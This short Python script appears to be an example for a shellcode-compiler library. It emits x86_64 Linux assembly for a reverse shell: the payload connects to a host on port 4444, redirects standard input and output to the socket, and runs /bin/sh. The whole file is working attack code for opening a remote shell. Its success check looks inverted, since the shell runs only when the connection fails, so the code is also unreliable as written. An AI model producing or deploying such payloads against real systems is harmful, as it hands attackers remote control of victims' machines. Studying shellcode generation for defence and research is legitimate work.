from int3 import FormatStyle, LinuxCompiler

HOST = "0.0.0.0"
PORT = 4444


def main():
    cc = LinuxCompiler(arch="x86_64")

    sock = cc.net_open_connection(ip_addr=HOST, port=PORT)
    with cc.if_else(sock < 0) as (then, otherwise):
        with then:
            for fd in range(3):
                cc.dup2(sock, fd)
            cc.sys_execve(b"/bin/sh")
        with otherwise:
            cc.sys_exit(0)

    print(cc.compile(format=FormatStyle.Assembly))


if __name__ == "__main__":
    main()
